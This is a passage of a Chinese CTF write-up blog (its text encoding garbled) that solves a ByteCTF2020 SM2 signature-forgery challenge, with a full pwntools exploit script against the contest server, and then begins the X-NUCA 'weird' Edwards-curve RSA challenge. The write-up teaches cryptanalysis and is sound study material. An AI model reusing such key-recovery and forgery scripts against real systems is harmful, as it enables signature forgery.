class="number">0</span>:<span class="keyword">self.para_len], </span><span class="number">16</span>)</span><br><span class="line">    return r == ((e + x) % <span class="keyword">self.n)</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªéªŒè¯å‡½æ•°æœ‰ä¸‰ä¸ªè¾“å…¥ï¼šrï¼Œsï¼Œeï¼Œç„¶åè¿™é‡Œæœ‰ä¸€ä¸ªself._kg ï¼Œè¿™ä¸ªå…¶å®å°±æ˜¯ä¸€ä¸ªæ¤­åœ†æ›²çº¿ä¸Šçš„ä¸€ä¸ªä¹˜æ³•ï¼Œæ‰€ä»¥P1 = s * gï¼Œgæ˜¯æ¤­åœ†æ›²çº¿ä¸Šçš„ä¸€ä¸ªåŸºç‚¹ï¼ŒP2 = t * pk ï¼Œä»£ç å‰å¤´æœ‰å¯¹pkçš„å®šä¹‰ <code>self.pk = self._kg(self.sk, ecc_table[&#39;g&#39;])</code>,æ‰€ä»¥å°±æ˜¯P2 = ((r+s)%n) * sk * gï¼Œæ¥ä¸‹æ¥çš„æ“ä½œä¸éš¾çœ‹å‡ºï¼Œè¿™é‡Œå°±æ˜¯ä¸¤ä¸ªç‚¹ç›¸åŠ ï¼Œè¿™é‡Œå¯ä»¥printå‡ºæ¥çœ‹ä¸€ä¸‹è¾“å‡ºï¼Œæ˜¯ä¸€ä¸ªç‚¹çš„åæ ‡çš„åå…­è¿›åˆ¶è¡¨ç¤ºçš„å­—ç¬¦ä¸²çš„æ‹¼æ¥ï¼Œxå°±æ˜¯è¿™ä¸ªç‚¹çš„xåæ ‡ã€‚æœ€åæ˜¯ä¸€ä¸ªåˆ¤æ–­ r == ((e + x) % self.n)</p><p>é¦–å…ˆeæ˜¯å›ºå®šçš„ bâ€™Hello, Welcome to ByteCTF2020!â€™ã€‚æˆ‘ä»¬èƒ½æ“ä½œçš„å°±æ˜¯rå’Œsäº†ï¼Œxæ˜¯ä¸€ä¸ªç®—å‡ºæ¥çš„åæ ‡ï¼Œä¸ºäº†è®©è¿™ä¸ªåˆ¤æ–­æˆç«‹ï¼Œæˆ‘ä»¬å°±éœ€è¦æ„é€ æˆ‘ä»¬çš„è¾“å…¥rï¼Œä¸ºäº†æ„é€ rå¾—æå‰ç®—å‡ºP1çš„xåæ ‡ï¼Œè€ŒP1=P1+P2 = s * g + ((r + s)%n) * sk * gã€‚ä¹ä¸€çœ‹æˆ‘ä»¬å¥½åƒé™·å…¥äº†æ­»é”ã€‚è¿™é‡Œå¤´æ€ä¹ˆåˆå‡ºç°äº†rï¼Ÿ</p><p>æ¢ä¸ªæ€è·¯æƒ³æƒ³ï¼Œè™½ç„¶è¿™é‡Œçš„P1æ˜¯åæ¥æ ¹æ®æˆ‘ä»¬çš„è¾“å…¥ç®—å‡ºæ¥çš„ï¼Œä½†å…¶å®æˆ‘ä»¬ä¹Ÿå¯ä»¥å…ˆå›ºå®šè¿™ä¸ªP1ã€‚æœ€åå†ç²¾å¿ƒæ„é€ ä¸€ä¸‹è¾“å…¥ï¼Œè®©ä»–æ­£å¥½ç®—å‡ºæ¥æ˜¯è¿™ä¸ªP1ï¼Œ</p><p>æ‰€ä»¥å‡è®¾æˆ‘ä»¬å·²ç»çŸ¥é“æœ€åçš„ç‚¹P1äº†ï¼Œå°±å½“ä»–æ˜¯2gå¥½äº†ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç®—å‡ºxäº†ï¼Œæœ‰äº†xï¼Œé‚£ä¹ˆrä¹Ÿå°±å›ºå®šä¸‹æ¥äº†ï¼Œé‚£æˆ‘ä»¬å°±å°±åªéœ€è¦æ„é€ sè®©å®ƒç®—å‡ºè¿™ä¸ªP1ç‚¹äº†ã€‚</p><p>æˆ‘ä»¬çŸ¥é“ï¼Œè™½ç„¶æ¤­åœ†æ›²çº¿çš„åŠ æ³•å’Œä¹˜æ³•ä¸åŒäºæ™®é€šçš„å››åˆ™è¿ç®—ï¼Œä½†æ˜¯ä¸€äº›è¿ç®—æ³•åˆ™è¿˜æ˜¯é€‚ç”¨çš„ï¼Œæ¯”å¦‚åˆ†é…å¾‹ã€äº¤æ¢å¾‹è¿™äº›ï¼Œæ‰€ä»¥å¼å­ï¼šP1=P1+P2 = s * g + ((r + s)%n) * sk * g å¯ä»¥åšä¸€äº›å˜å½¢ï¼Œæˆ‘ä»¬å·²ç»çŸ¥é“P1=2gäº†ï¼Œå¤–åŠ è¿™æ¡æ›²çº¿çš„é˜¶æ˜¯nï¼ˆæˆ‘æ‰¿è®¤æˆ‘æœ‰èµŒçš„æˆåˆ†ï¼‰ï¼Œæ‰€ä»¥æœ‰</p><p>$2*g \equiv  s * g + (r + s) * sk * g \pmod n$</p><p>$2 \equiv  s + (r+s)* sk \pmod n$</p><p>$2 \equiv s*(sk+1) + r *sk  \pmod n$</p><p>$s \equiv (2 -r*sk) *( sk+1)^{-1} \pmod n$</p><p>å…¶ä¸­rç¡®å®šäº†ï¼Œnç¡®å®šäº†ï¼Œåªå‰©skäº†ï¼Œè€Œskå…¶å®ä¹Ÿå°±æ˜¯ç›¸å½“äºè¿™æ¡æ¤­åœ†æ›²çº¿çš„ç§é’¥</p><p>è¿™æ˜¯æˆ‘ä»¬å¾—å›è¿‡å¤´æ¥çœ‹æœ€åˆçš„signå‡½æ•°äº†</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def sign(tsm2):</span><br><span class="line">    data = <span class="function"><span class="keyword">func</span>.<span class="title">random_hex</span><span class="params">(len<span class="params">(n)</span></span></span>) </span><br><span class="line">    k1_str = <span class="function"><span class="keyword">func</span>.<span class="title">random_hex</span><span class="params">(len<span class="params">(n)</span></span></span>)</span><br><span class="line">    <span class="built_in">print</span>(tsm2.send_p1(data, k1_str))</span><br><span class="line">    backdoor = input('backdoor:').strip()</span><br><span class="line">    result = tsm2.output_p1(k1_str, backdoor)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>ä¸èƒ½å†æ˜æ˜¾äº†ï¼Œbackdooréƒ½å†™ç»™ä½ äº†ï¼Œæ˜¾ç„¶æ˜¯è¦åˆ©ç”¨è¿™é‡Œæ¥æ•´åˆ°skï¼Œ</p><p>dataå’Œk1_stréƒ½æ˜¯ä¸å¯æ§çš„éšæœºæ•°ï¼Œ</p><p>ç„¶åprintäº†send_p1å‡½æ•°çš„è¾“å‡ºï¼Œ</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_p1</span><span class="params">(<span class="keyword">self</span>, data, k1_str)</span></span><span class="symbol">:</span></span><br><span class="line">        e = int(data, <span class="number">16</span>)</span><br><span class="line">        k1 = int(k1_str, <span class="number">16</span>)</span><br><span class="line">        k1 = k1 % <span class="keyword">self</span>.n</span><br><span class="line">        R1 = <span class="keyword">self</span>._kg(k1, <span class="keyword">self</span>.ecc_table[<span class="string">'g'</span>]) </span><br><span class="line">        <span class="keyword">return</span> <span class="string">'%064x%0128s'</span> % (e, R1)</span><br></pre></td></tr></table></figure><p>ç»™çš„æ˜¯dataå’Œä¸€ä¸ªR1ï¼ŒR1æ˜¯k1 * gï¼Œæ˜¯ä¸€ä¸ªæ›²çº¿ä¸Šçš„ç‚¹ï¼Œå¥½åƒæ²¡å•¥ç”¨å•Šï¼Œç»§ç»­çœ‹</p><p>æ‹¿åˆ°æˆ‘ä»¬çš„è¾“å…¥åï¼Œç¨‹åºæŠŠk1_strå’Œæˆ‘ä»¬çš„è¾“å…¥ä¼ ç»™äº†output_p1å¹¶ç»™äº†è¾“å‡º</p><figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">def output_p1(<span class="keyword">self</span>, k1_str, r_s2_s3):</span><br><span class="line">        r = <span class="keyword">int</span>(r_s2_s3[<span class="number">0</span>:<span class="keyword">self</span>.para_len], <span class="number">16</span>)</span><br><span class="line">        s2 = <span class="keyword">int</span>(r_s2_s3[<span class="keyword">self</span>.para_len:<span class="number">2</span> * <span class="keyword">self</span>.para_len], <span class="number">16</span>)</span><br><span class="line">        s3 = <span class="keyword">int</span>(r_s2_s3[<span class="number">2</span> * <span class="keyword">self</span>.para_len:], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">        k1 = <span class="keyword">int</span>(k1_str, <span class="number">16</span>)</span><br><span class="line">        d1 = <span class="keyword">self</span>.sks</span><br><span class="line">        s = (d1 * k1 * s2 + d1 * s3 - r) % <span class="keyword">self</span>.n </span><br><span class="line">        <span class="keyword">if</span> s == <span class="number">0</span> <span class="keyword">or</span> s == (<span class="keyword">self</span>.n - r):</span><br><span class="line">            <span class="keyword">return</span> None</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'%064x%064x'</span> % (r, s)</span><br></pre></td></tr></table></figure><p>ç»™çš„æ˜¯rå’Œsï¼Œåªè¦sä¸ç­‰äº0ï¼Œs+rä¸ç­‰äºnï¼Œ</p><p>å…¶ä¸­æˆ‘ä»¬çš„è¾“å…¥åº”è¯¥æ˜¯96å­—èŠ‚çš„ï¼Œåˆ†ä¸ºä¸‰æ®µï¼Œä»£è¡¨rï¼Œs2ï¼Œs3ï¼Œ</p><p>k1æ˜¯å°±æ˜¯k1_strçš„æ•´å‹ï¼Œç¨‹åºä¹‹å‰ç”Ÿæˆçš„ï¼Œd1æ˜¯self.sksï¼Œè¿™åœ¨ä»£ç é‡Œå¤´æ˜¯<code>self.sks = int(func.random_hex(self.para_len), 16)</code>ä¹Ÿæ˜¯ä¸€ä¸ªéšæœºæ•°ï¼Œä½†æ˜¯å®ƒå’Œskè·Ÿpksæœ‰ç‚¹å…³ç³»ï¼š<code>self.pks = pow((self.sk + 1) * self.sks, self.n - 2, self.n) % self.n</code></p><p>ä¹‹æ‰€ä»¥æ‰¯åˆ°pksï¼Œå› ä¸ºç¨‹åºä¸€è¿›å»ä»–å°±æŠŠè¿™ä¸ªå€¼ç»™æˆ‘ä»¬äº†å•Š</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    sk = func.random_hex(len(sm2p256v1_ecc_table[<span class="string">'n'</span>]))</span><br><span class="line">    tsm2 = TSM2(sk)</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">'pk:%s'</span>   %tsm2.pk)</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">'pks:%064x'</span>%tsm2.pks)</span><br></pre></td></tr></table></figure><p>æ ¹æ®pksçš„ç”Ÿæˆå¼å­ï¼Œå…¶ä¸­é™¤äº†skå’Œsksæˆ‘ä»¬éƒ½çŸ¥é“ï¼Œ</p><p>æ‰€ä»¥æˆ‘ä»¬åº”è¯¥å°±æ˜¯è¦åˆ©ç”¨è¿™ä¸ªpksï¼Œsksæ¥æ¢å¤è¿™ä¸ªskï¼Œä½†æ˜¯æ€ä¹ˆè·å¾—è¿™ä¸ªsks ä¹Ÿå³ d1 å‘¢ï¼Œ</p><p><code>s = (d1 * k1 * s2 + d1 * s3 - r) % self.n</code></p><p>è®©s2=0ï¼Œs3=1ï¼Œr=0ï¼Œè¿™æ ·å°±èƒ½å¾—åˆ° s = d1 % näº†</p><p>æ˜¾ç„¶d1 &lt; n ï¼Œæ•…s = d1ï¼Œå¹¶ä¸” d1 + r != nï¼Œæ•…èƒ½è¿”å›ã€‚</p><p>é‚£ä¹ˆè‡³æ­¤ï¼Œåˆ©ç”¨é“¾å°±å…¨äº†ã€‚</p><h4 id="è§£é¢˜æµç¨‹"><a href="#è§£é¢˜æµç¨‹" class="headerlink" title="è§£é¢˜æµç¨‹"></a>è§£é¢˜æµç¨‹</h4><p>æ‰€ä»¥è¿™é“é¢˜çš„æ•´ä¸ªè§£é¢˜æµç¨‹ï¼š</p><ol><li><p>æ„é€ backdoor = 191 * â€˜0â€™ + â€˜1â€™ æ¥è·å–sksï¼Œ</p></li><li><p>åˆ©ç”¨pksæ¥è·å–skï¼Œ</p></li><li><p>éšä¾¿åœ¨æ›²çº¿ä¸Šå–ä¸€ä¸ªç‚¹ï¼Œè®¡ç®—xï¼Œæ ¹æ®eæ¥å›ºå®šr</p></li><li><p>è®¡ç®—$s \equiv (2 -r*sk) *( sk+1)^{-1} \pmod n$</p></li><li><p>ä¼ å…¥rï¼Œsï¼Œeï¼Œè·å–flag</p></li></ol><p>exp</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">from gmssl import func, sm2</span><br><span class="line">from Crypto.Util.<span class="keyword">number</span> import *</span><br><span class="line"></span><br><span class="line">from TSM2 import *</span><br><span class="line"></span><br><span class="line">sk = func.random_hex(<span class="built_in">len</span>(sm2p256v1_ecc_table[<span class="string">'n'</span>]))</span><br><span class="line">tsm2 = TSM2(sk)</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">sh</span>=remote(<span class="string">"182.92.215.134"</span>,<span class="string">"30103"</span>)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"pk:"</span>)</span><br><span class="line">pk =<span class="keyword">int</span>(<span class="keyword">sh</span>.recvuntil(<span class="string">"\n"</span>)[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"pks:"</span>)</span><br><span class="line">pks=<span class="keyword">int</span>(<span class="keyword">sh</span>.recvuntil(<span class="string">"\n"</span>)[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">tsm2.pks=pks</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"op:"</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(<span class="string">"sign"</span>)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"backdoor:"</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(<span class="string">"0"</span>*<span class="number">191</span>+<span class="string">"1"</span>)</span><br><span class="line">sks = <span class="keyword">int</span>(<span class="keyword">sh</span>.recvuntil(<span class="string">"\n"</span>)[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">tsm2.sks=sks</span><br><span class="line">tmp = inverse(tsm2.pks,tsm2.n)</span><br><span class="line">tsm2.sk=tmp*inverse(tsm2.sks,tsm2.n)%tsm2.n-<span class="number">1</span></span><br><span class="line">tsm2.pk = tsm2._kg(tsm2.sk, tsm2.ecc_table[<span class="string">'g'</span>])</span><br><span class="line">assert <span class="keyword">int</span>(tsm2.pk,<span class="number">16</span>)==pk</span><br><span class="line"><span class="keyword">print</span>(tsm2.sk)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"op:"</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(<span class="string">"verify"</span>)</span><br><span class="line"><span class="keyword">e</span>=bytes_to_long(<span class="keyword">b</span><span class="string">'Hello, Welcome to ByteCTF2020!'</span>)</span><br><span class="line"><span class="keyword">b</span> = <span class="number">2</span></span><br><span class="line">B = tsm2._kg(<span class="keyword">b</span>, tsm2.ecc_table[<span class="string">'g'</span>])</span><br><span class="line"><span class="keyword">x</span> = <span class="keyword">int</span>(B[<span class="number">0</span>:tsm2.para_len], <span class="number">16</span>)</span><br><span class="line">r = ((<span class="keyword">e</span> + <span class="keyword">x</span>) % tsm2.n)</span><br><span class="line">#b = s + (s+r)*sk</span><br><span class="line">#b = s*(<span class="number">1</span>+sk) + r*sk</span><br><span class="line">#b - r*sk</span><br><span class="line">n=<span class="number">0</span>xFFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFF7203DF6B21C6052B53BBF40939D54123</span><br><span class="line"><span class="keyword">print</span>(tsm2.sk,)</span><br><span class="line">s = (<span class="keyword">b</span> - r*tsm2.sk)*inverse(<span class="number">1</span>+tsm2.sk,n)%n</span><br><span class="line"><span class="keyword">sign</span> = <span class="string">'%064x%064x'</span> % (r, s)</span><br><span class="line"><span class="keyword">print</span>(<span class="keyword">sign</span>)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"msg:"</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(<span class="string">"Hello, Welcome to ByteCTF2020!"</span>)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"sign:"</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(<span class="keyword">sign</span>)</span><br><span class="line"><span class="keyword">sh</span>.interactive()</span><br></pre></td></tr></table></figure><h2 id="X-NUCA"><a href="#X-NUCA" class="headerlink" title="X-NUCA"></a>X-NUCA</h2><h3 id="weird"><a href="#weird" class="headerlink" title="weird"></a>weird</h3><p>éœ€è¦å‰ç½®çŸ¥è¯†æˆ–äº†è§£ï¼šå¥‡å¼‚çˆ±å¾·åæ›²çº¿</p><p>å¯å‚è€ƒèµ„æ–™ï¼š<a href="https://learnblockchain.cn/article/1627" target="_blank" rel="noopener">https://learnblockchain.cn/article/1627</a></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env sage</span><br><span class="line">from secret import FLAG</span><br><span class="line">assert FLAG.startswith(<span class="keyword">b</span><span class="string">"X-NUCA&#123;"</span>) <span class="built_in">and</span> FLAG.endswith(<span class="keyword">b</span><span class="string">"&#125;"</span>)</span><br><span class="line"></span><br><span class="line">def key_gen(bits):</span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        <span class="keyword">p</span> = random_prime(<span class="number">2</span>**bits)</span><br><span class="line">        q = random_prime(<span class="number">2</span>**bits)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">p</span> % <span class="number">4</span> == <span class="number">3</span> <span class="built_in">and</span> q % <span class="number">4</span> == <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">p</span> &lt; q:</span><br><span class="line">        <span class="keyword">p</span>, q = q, <span class="keyword">p</span></span><br><span class="line">    <span class="keyword">N</span> = <span class="keyword">p</span> * q</span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        <span class="keyword">x</span> = getrandbits(bits // <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">y</span> = getrandbits(bits // <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> gcd(<span class="keyword">x</span>, <span class="keyword">y</span>) == <span class="number">1</span> <span class="built_in">and</span> (<span class="keyword">x</span> * <span class="keyword">y</span>) &lt; (<span class="keyword">int</span>(<span class="built_in">sqrt</span>(<span class="number">2</span> * <span class="keyword">N</span>)) // <span class="number">12</span>):</span><br><span class="line">            <span class="keyword">e</span> = randint( <span class="keyword">int</span>(((<span class="keyword">p</span> + <span class="number">1</span>) * (q + <span class="number">1</span>) * <span class="number">3</span> * (<span class="keyword">p</span> + q) - (<span class="keyword">p</span> - q) * <span class="keyword">int</span>(<span class="keyword">N</span>**<span class="number">0.21</span>)) * <span class="keyword">y</span> / (<span class="keyword">x</span> * <span class="number">3</span> * (<span class="keyword">p</span> + q))), <span class="keyword">int</span>(((<span class="keyword">p</span> + <span class="number">1</span>) * (q + <span class="number">1</span>) * <span class="number">3</span> * (<span class="keyword">p</span> + q) + (<span class="keyword">p</span> - q) * <span class="keyword">int</span>(<span class="keyword">N</span>**<span class="number">0.21</span>)) * <span class="keyword">y</span> / (<span class="keyword">x</span> * <span class="number">3</span> * (<span class="keyword">p</span> + q))) )</span><br><span class="line">            <span class="keyword">if</span> gcd(<span class="keyword">e</span>, (<span class="keyword">p</span> + <span class="number">1</span>) * (q + <span class="number">1</span>)) == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">k</span> = inverse_mod(<span class="keyword">e</span>, (<span class="keyword">p</span> + <span class="number">1</span>) * (q + <span class="number">1</span>))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">N</span>, <span class="keyword">e</span>, <span class="keyword">k</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    bits = <span class="number">1024</span></span><br><span class="line">    <span class="keyword">N</span>, <span class="keyword">e</span>, _ = key_gen(bits)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">pt</span> = (<span class="keyword">int</span>.from_bytes(FLAG[:<span class="number">32</span>], <span class="string">'big'</span>), <span class="keyword">int</span>.from_bytes(FLAG[<span class="number">32</span>:], <span class="string">'big'</span>))</span><br><span class="line">    ct = (<span class="number">0</span>, <span class="number">1</span>)    </span><br><span class="line">    d = (((<span class="keyword">pt</span>[<span class="number">1</span>])**<span class="number">2</span> - <span class="number">1</span>) * inverse_mod(((<span class="keyword">pt</span>[<span class="number">1</span>])**<span class="number">2</span> + <span class="number">1</span>) * (<span class="keyword">pt</span>[<span class="number">0</span>])**<span class="number">2</span>, <span class="keyword">N</span>)) % <span class="keyword">N</span></span><br><span class="line">    </span><br><span class="line">    # <span class="number">2000</span> years <span class="keyword">later</span>...:)</span><br><span class="line">    <span class="keyword">for</span> _ in <span class="built_in">range</span>(<span class="keyword">e</span>):</span><br><span class="line">        ct = ( <span class="keyword">int</span>((ct[<span class="number">0</span>] * <span class="keyword">pt</span>[<span class="number">1</span>] + ct[<span class="number">1</span>] * <span class="keyword">pt</span>[<span class="number">0</span>]) * inverse_mod(<span class="number">1</span> + d * ct[<span class="number">0</span>] * <span class="keyword">pt</span>[<span class="number">0</span>] * ct[<span class="number">1</span>] * <span class="keyword">pt</span>[<span class="number">1</span>], <span class="keyword">N</span>) % <span class="keyword">N</span>), <span class="keyword">int</span>((ct[<span class="number">1</span>] * <span class="keyword">pt</span>[<span class="number">1</span>] + d * ct[<span class="number">0</span>] * <span class="keyword">pt</span>[<span class="number">0</span>]) * inverse_mod(<span class="number">1</span> - d * ct[<span class="number">0</span>] * <span class="keyword">pt</span>[<span class="number">0</span>] * ct[<span class="number">1</span>] * <span class="keyword">pt</span>[<span class="number">1</span>], <span class="keyword">N</span>) % <span class="keyword">N</span>) )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">f</span> = <span class="keyword">open</span>(<span class="string">"output.txt"</span>, <span class="string">"wb"</span>)</span><br><span class="line">    <span class="keyword">f</span>.<span class="keyword">write</span>(str((<span class="keyword">e</span>, <span class="keyword">N</span>)).encode() + <span class="keyword">b</span><span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">f</span>.<span class="keyword">write</span>(str(ct).encode())</span><br><span class="line">    <span class="keyword">f</span>.<span class="keyword">close</span>()</span><br></pre></td></tr></table></figure><p>å¥½çš„ï¼Œç¬¬ä¸€é¢˜ä»£ç é‡ä¸å¤šï¼Œä¸é”™ä¸é”™ï¼ˆå—¯ï¼Ÿä¼¼æ›¾ç›¸è¯†ï¼Œå±ã€‚ã€‚ï¼‰é¦–å…ˆçœ‹çœ‹ä»–çš„åŠŸèƒ½ï¼ŒåŠ å¯†æ–¹å¼æ˜¯æŠŠflagæ‹†æˆäº†å·¦å³ä¸¤ä»½ï¼Œç»„æˆä¸€ä¸ªæ•°å¯¹ï¼Œç„¶ååšäº†eæ¬¡çš„æ“ä½œï¼Œå¾—åˆ°ä¸€ä¸ªctæ•°å¯¹ã€‚è¿™é‡Œçš„eæ¬¡æ“ä½œå…¶å®å°±æ˜¯ä¸€ä¸ªå¥‡å¼‚çˆ±å¾·åæ›²çº¿çš„ä¸€ä¸ªä¹˜æ³•æ“ä½œã€‚ï¼ˆé¢˜ç›®åä¸å°±æ˜¯weirdä¹ˆï¼Ÿï¼‰æ‰€ä»¥æœ‰äº†eä½œä¸ºåŠ å¯†çš„å…¬é’¥ï¼Œæˆ‘ä»¬è‡ªç„¶å°±è¦æ‰¾ç§é’¥dï¼Œè€Œç§é’¥dï¼Œï¼ˆæˆ‘æ‰¿è®¤æˆ‘æœ‰èµŒçš„æˆåˆ†ï¼‰d=inverse(e,(p+1) * (q+1))ï¼Œï¼ˆæ›¾ç»åœ¨ä¸€ç¯‡paperé‡Œçœ‹åˆ°è¿‡ä¸€çœ¼ï¼Œè™½ç„¶ç”¨çš„å¹¶éå¥‡å¼‚çˆ±å¾·åæ›²çº¿ï¼‰</p><p><img src="https://i.loli.net/2020/12/17/CDvyNE26ImwhYZA.png" alt="image-20201102183336623"></p><p>å…¶ä¸­pï¼Œqæ˜¯å¤§æ•°Nçš„ä¸€ä¸ªåˆ†è§£ã€‚è¿™é‡Œé˜¶çš„ç¡®å®šä¸æ˜¯å¾ˆä¸¥æ ¼ï¼Œä½†å…ˆè¯•è¯•å•¦ã€‚é‚£ä¹ˆè¦è¿™ä¹ˆè¯•çš„è¯å°±è¦åˆ†è§£Nï¼Œé‚£å°±è¦çœ‹åˆ°è¿™ä¸ªkeygençš„è¿‡ç¨‹äº†ï¼Œè¿™é‡Œpï¼Œqçš„ç”Ÿæˆæœ‰ä¸€ç‚¹ç‚¹å°è¦æ±‚ï¼Œç„¶åå°±æ˜¯è¿™ä¸ªeçš„ç”Ÿæˆï¼Œä¸ºäº†ç”Ÿæˆè¿™ä¸ªeï¼Œè¿˜ç‰¹æ„æ•´äº†ä¸ªxï¼Œyã€‚æœ€åè¦æ±‚gcd(e, (p+1) * (q+1))ï¼Œå”‰ï¼Œè¿™ï¼Œæ„Ÿè§‰æˆ‘çš„çŒœæµ‹æ˜¯å¯¹çš„å¥½å­ã€‚åˆ°äº†è¿™é‡Œï¼Œï¼Œè¿™è¿˜ä¸åƒè¥¿æ¹–è®ºå‰‘çš„é‚£ä¸€é“é¢˜å˜›<a href="https://mp.weixin.qq.com/s?__biz=MzU1MzE3Njg2Mw==&mid=100004157&idx=1&sn=ba121056137afd43cd1768c66f1cad20&chksm=7bf78b4d4c80025b9dec44e9cd33702f2a5174cafb491ddf893e5229e9e5909e1ffda4b550ec&xtrack=1&scene=0&subscene=10000&clicktime=1604313274&enterid=1604313274&ascene=7&devicetype=android-29&version=27001353&nettype=ctnet&abtest_cookie=AAACAA%3D%3D&lang=zh_CN&exportkey=A%2BEVclkqshGGX1AhhJLO4XU%3D&pass_ticket=BxnNKDSg4NDA9EVhX4ioGO7c%2Fv4T%2BEtwsPAmYnDNjByfyEKbNWLjsXUcxQLtmrfk&wx_header=1" target="_blank" rel="noopener">Wake me until May ends</a>ã€‚è¿™é“é¢˜ç›¸å…³çš„paperæåˆ°</p><p>å¦‚æœeæ»¡è¶³ä¸€å®šçš„æ¡ä»¶ï¼Œ</p><p><img src="https://i.loli.net/2020/12/17/Xi7LcNKjHEbYUOJ.png" alt="image-20201102184915448"></p><p>é‚£ä¹ˆxï¼Œyå°±ä¼šåœ¨e/Nçš„è¿åˆ†æ•°ä¸Šï¼Œå¹¶ä¸”é€šè¿‡xå’Œyå¯ä»¥è·å¾—Tï¼šp+qçš„ä¸€ä¸ªè¿‘ä¼¼ã€‚</p><p><img src="https://i.loli.net/2020/12/17/OLiZTxfQbUqVRWs.png" alt="image-20201102184201011"></p><p>é‚£ä¹ˆå›åˆ°è¿™é“é¢˜æœ¬èº«ï¼Œeçš„å–å€¼</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e = randint( <span 